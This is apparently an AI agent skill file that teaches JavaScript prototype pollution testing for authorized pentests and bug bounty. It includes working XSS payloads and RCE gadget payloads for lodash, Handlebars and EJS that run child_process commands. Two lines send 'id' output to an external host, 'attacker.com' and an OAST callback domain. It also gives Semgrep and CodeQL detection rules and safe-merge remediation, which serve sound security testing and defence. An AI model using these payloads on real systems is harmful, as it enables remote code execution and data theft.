---
id: prototype-pollution
name: Prototype Pollution Specialist
description: >
  JavaScript prototype pollution specialist for authorized pentests and bug bounty —
  covers client-side pollution via URL/JSON, server-side via merge/extend/clone
  functions, gadget chains to XSS (innerHTML, document.write, jQuery), gadget chains
  to RCE via template engines (child_process, lodash template), AST-based detection,
  vulnerable library CVEs (lodash <4.17.21, jQuery <3.4.0, Hoek, merge), and PoC
  templates. Use when testing or exploiting prototype pollution in JavaScript
  applications (browser or Node.js).
triggers:
  - prototype pollution
  - __proto__
  - constructor.prototype
  - merge function
  - lodash merge
  - object assign pollution
  - PP gadget
  - polluted prototype
  - property injection javascript
  - template engine rce prototype
version: "1.0"
authored: "2026-10-30"
---

# Prototype Pollution Specialist Skill

## Overview

Prototype pollution is a JavaScript vulnerability where an attacker can inject
properties into `Object.prototype` (or `Array.prototype`), causing every object in
the application to inherit those properties. Depending on what the application does
with inherited properties (gadgets), this can lead to XSS, privilege escalation,
denial-of-service, or remote code execution.

**Scope:** authorized pentests and bug bounty programs only.

---

## 1. Fundamentals

Every plain JavaScript object inherits from `Object.prototype`. If an attacker can
write to `__proto__`, `constructor.prototype`, or `Object.prototype` directly, all
subsequently created objects inherit the injected property.

```js
// The vulnerability in a nutshell
let obj = {};
obj["__proto__"]["isAdmin"] = true;

let victim = {};
console.log(victim.isAdmin); // true — inherited from Object.prototype
```

The attack surface: any code that recursively copies/merges properties from
attacker-controlled input into a plain object without a prototype check.

---

## 2. Client-Side Prototype Pollution

### 2.1 Via URL Query String

Many legacy URL-parsing libraries (qs < 6.7.3, jQuery < 3.4.0) parse query strings
like this:

```
https://target.com/?__proto__[isAdmin]=true
https://target.com/?constructor[prototype][isAdmin]=true
```

Test via browser DevTools console after loading the page:

```js
({}).isAdmin  // true = polluted
```

### 2.2 Via JSON Input

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

JSON.parse itself is safe — the vulnerability is in the code that walks the parsed
object with a merge/assign/clone function.

### 2.3 Via Hash / Fragment (DOM-based)

Some SPAs parse `location.hash` or `location.search` into objects. Inject via:

```
https://target.com/#__proto__[polluted]=1
```

### 2.4 Minimal Client-Side Detection PoC

```js
// Paste into DevTools console before and after loading a suspicious URL/payload
let before = Object.keys(Object.prototype).length;
// ... trigger the feature (submit form, load page with payload in query) ...
let after = Object.keys(Object.prototype).length;
console.log(after > before ? "POLLUTED" : "clean");
// Also check:
console.log(({}).polluted);   // your injected key
```

---

## 3. Server-Side Prototype Pollution (Node.js)

### 3.1 Vulnerable Merge Pattern

The classic vulnerable function:

```js
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === "object") {
      merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];  // <-- no prototype check
    }
  }
}

merge({}, JSON.parse('{"__proto__":{"polluted":true}}'));
console.log({}.polluted); // true
```

### 3.2 Other Vulnerable Operations

```js
// Deep extend
_.extend({}, payload);          // lodash < 4.17.21
$.extend(true, {}, payload);    // jQuery < 3.4.0

// Object spread does NOT pollute — safe:
let obj = { ...untrusted };     // Object.assign at depth 1 also safe

// But lodash _.merge IS vulnerable:
_.merge({}, JSON.parse(payload));

// Hoek.merge (Hapi.js framework utility)
Hoek.merge({}, payload);
```

### 3.3 Detecting Server-Side

Send a payload that, if polluted, causes a behavioral change:

```json
POST /api/settings
{"__proto__":{"outputFunctionName":"_tmp1;global.pp=1;//"}}
```

Then probe for side effects:
- Unexpected properties appearing in API responses
- Error messages that include your injected value
- Status code changes (500 if gadget fires)

**Tool:** [server-side-prototype-pollution](https://github.com/nicolo-ribaudo/sspp) scanner,
or manual via the techniques below.

---

## 4. Gadget Chains — XSS

A gadget is existing application code that reads an inherited property and uses it
in a dangerous sink. The attacker supplies the property via prototype pollution.

### 4.1 innerHTML Gadget

```js
// Gadget code (already in the app, attacker cannot change it)
function renderTemplate(config) {
  document.getElementById("output").innerHTML = config.template || "";
}

// No config.template in the original call, so it falls through to the prototype
// Attacker pollutes:
Object.prototype.template = "<img src=x onerror=alert(1)>";
renderTemplate({});  // XSS fires
```

### 4.2 jQuery html() Gadget

```js
// jQuery uses $.fn.html internally on many widgets
// Pollution:
Object.prototype.html = "<img src=x onerror=alert(document.cookie)>";
```

### 4.3 document.write Gadget

```js
Object.prototype.content = "<script>alert(1)<\/script>";
// Fires when any code does: document.write(config.content || "")
```

### 4.4 jQuery $.extend() Gadget Chain (CVE-2019-11358)

```json
{"__proto__":{"xss":"<img src=x onerror=alert(origin)>"}}
```

When `$.extend(true, {}, untrusted)` is called, XSS property is on every object;
if jQuery's own rendering picks it up, it fires.

---

## 5. Gadget Chains — RCE (Node.js)

### 5.1 child_process via Template Engines

**Lodash _.template** uses `Function()` constructor internally. The `sourceURL`
and `variable` options land on the prototype and are later used in `new Function(...)`.

CVE: **CVE-2021-23337** (lodash < 4.17.21, CVSS 7.2)

```json
{
  "__proto__": {
    "type": "TrustedHTML",
    "sourceURL": "\u000areturn process.mainModule.require('child_process').execSync('id')//",
    "variable": "data"
  }
}
```

**Handlebars** (CVE-2019-19919):

```json
{
  "__proto__": {
    "pendingContent": "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id').toString();\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}"
  }
}
```

**EJS** template engine (CVE-2022-29078, CVSS 9.8):

```json
{
  "__proto__": {
    "outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('curl http://attacker.com/?x=$(id)');var __tmp2"
  }
}
```

### 5.2 Generic Node.js RCE Gadget Search

```bash
# Use ppmap to auto-discover gadgets in a target application
npm install -g @nicolo-ribaudo/ppmap
ppmap --url https://target.com/endpoint --method POST --data '{}'

# Manual gadget hunting: grep for dangerous sinks that read object properties
grep -rn "eval\|Function(\|execSync\|spawn\|exec(" node_modules/ | \
  grep -v "test\|spec" | head -50
```

---

## 6. Vulnerable Libraries — CVE Reference

| Library | Vulnerable Version | CVE | CVSS | Gadget / Impact |
|---|---|---|---|---|
| lodash | < 4.17.21 | CVE-2021-23337 | 7.2 | `_.template` → RCE via `sourceURL` |
| lodash | < 4.17.17 | CVE-2020-28500 | 7.5 | `_.zipObjectDeep` → ReDoS (DoS) |
| lodash | < 4.17.16 | CVE-2020-8203 | 7.4 | `_.merge` / `_.zipObjectDeep` → PP |
| jQuery | < 3.4.0 | CVE-2019-11358 | 6.1 | `$.extend(true,...)` → XSS |
| Hoek | < 4.2.1 / < 5.0.3 | CVE-2018-3728 | 6.4 | `Hoek.merge` → PP |
| merge | < 2.1.1 | CVE-2018-16490 | 9.8 | `merge()` → PP |
| Handlebars | < 4.7.7 | CVE-2019-19919 | 9.8 | template compilation → RCE |
| EJS | < 3.1.7 | CVE-2022-29078 | 9.8 | `outputFunctionName` → RCE |
| flat | < 5.0.1 | CVE-2020-8203 | 7.4 | `unflatten()` → PP |
| mquery (MongoDB) | < 3.2.3 | CVE-2021-23438 | 9.8 | query builder → PP → RCE |

**Always verify CVEs against NVD before reporting:**
`https://nvd.nist.gov/vuln/search/results?query=prototype+pollution`

---

## 7. AST-Based Detection

### 7.1 Semgrep Rules

```yaml
rules:
  - id: prototype-pollution-merge
    patterns:
      - pattern: |
          for (let $KEY in $SRC) {
            ...
            $TARGET[$KEY] = $SRC[$KEY];
            ...
          }
    message: "Potential prototype pollution: recursive merge without prototype check"
    languages: [javascript, typescript]
    severity: WARNING

  - id: proto-key-access
    pattern: $OBJ["__proto__"]
    message: "__proto__ key access — potential pollution vector"
    languages: [javascript, typescript]
    severity: ERROR
```

### 7.2 CodeQL Query (JavaScript)

```ql
import javascript

from DataFlow::PropWrite pw
where pw.getPropertyName() = "__proto__"
  or pw.getPropertyName() = "constructor"
select pw, "Potential prototype pollution write"
```

### 7.3 Runtime Detection (Node.js middleware)

```js
// Freeze Object.prototype in production (breaks nothing in compliant code)
Object.freeze(Object.prototype);

// Or use --disable-proto=throw (Node.js >= 16)
// Launch: node --disable-proto=throw app.js
```

---

## 8. PoC Template

### 8.1 Client-Side XSS via PP

```html
<!-- Save as poc.html, open in browser, check for alert() -->
<script>
// Step 1: Pollute via a vulnerable merge function on the page
// (Replace with actual vulnerable endpoint/function)
function merge(t, s) {
  for (let k in s) {
    if (typeof s[k] === "object") {
      t[k] = t[k] || {};
      merge(t[k], s[k]);
    } else {
      t[k] = s[k];
    }
  }
}

const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(document.domain)>"}}');
merge({}, payload);

// Step 2: Trigger the gadget (innerHTML read from prototype)
const div = document.createElement("div");
document.body.appendChild(div);
div.innerHTML = div.innerHTML || "";  // gadget reads from prototype
</script>
```

### 8.2 Server-Side RCE via EJS

```bash
# Proof of concept for CVE-2022-29078 style pollution:
curl -s -X POST https://target.com/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\"child_process\").exec(\"curl http://collaborator.oast.pro/?pp=$(id)\");var __tmp2"}}'
# Check Collaborator/interactsh for a callback with the id output
```

### 8.3 Blind Detection Payload

```json
{
  "__proto__": {
    "toString": "polluted"
  }
}
```

If the server later throws a `TypeError: Cannot convert object to primitive value`
or equivalent, the prototype was polluted (toString is now a string, not a function).

---

## 9. Tooling

| Tool | Purpose | Link |
|---|---|---|
| ppmap | Auto-discover PP gadgets in Node apps | https://github.com/nicolo-ribaudo/ppmap |
| server-side-prototype-pollution scanner | Burp extension for PP detection | https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8 |
| DOM Invader (Burp Suite) | Browser-side PP detection via Burp's embedded browser | Built into Burp Suite Pro |
| prototype-pollution-exploit-kit | Gadget chain PoC collection | https://github.com/BlackFan/client-side-prototype-pollution |
| semgrep | Static AST analysis for PP patterns | `semgrep --config p/javascript` |

---

## 10. Finding Schema (Report Format)

```
Title: Prototype Pollution in [library/endpoint] leading to [XSS/RCE/DoS]
Severity: Critical (RCE) / High (XSS) / Medium (DoS / auth bypass)
CWE: CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)
CVE (if library): [CVE-YYYY-NNNNN]
CVSS:
  - RCE: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
  - XSS: 6.1–8.8 depending on context
Evidence:
  - Payload: [JSON/query string that causes pollution]
  - Proof: [alert(), OOB callback, id output, or console.log showing polluted proto]
  - Gadget: [which code path reads the injected property and causes harm]
Root Cause:
  - Recursive merge/extend without hasOwnProperty check
  - Vulnerable library: [name version]
Remediation:
  1. Replace vulnerable merge/extend with a prototype-safe implementation:
     use Object.create(null) as merge target, or check hasOwnProperty.
  2. Upgrade [library] to [safe version].
  3. Freeze Object.prototype in Node.js: Object.freeze(Object.prototype)
     or use --disable-proto=throw.
  4. Validate JSON input: reject keys "__proto__", "constructor", "prototype".
References:
  - https://portswigger.net/web-security/prototype-pollution
  - https://github.com/nicolo-ribaudo/ppmap
  - https://nvd.nist.gov/vuln/detail/CVE-YYYY-NNNNN
```

---

## 11. Quick Remediation Patterns

```js
// Safe merge — check hasOwnProperty before assigning
function safeMerge(target, source) {
  for (let key of Object.keys(source)) {      // Object.keys, not for...in
    if (key === "__proto__" || key === "constructor" || key === "prototype") continue;
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = target[key] || Object.create(null);
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Or simply use structuredClone() for deep copy in modern Node.js / browsers
const safeClone = structuredClone(untrustedInput);
```
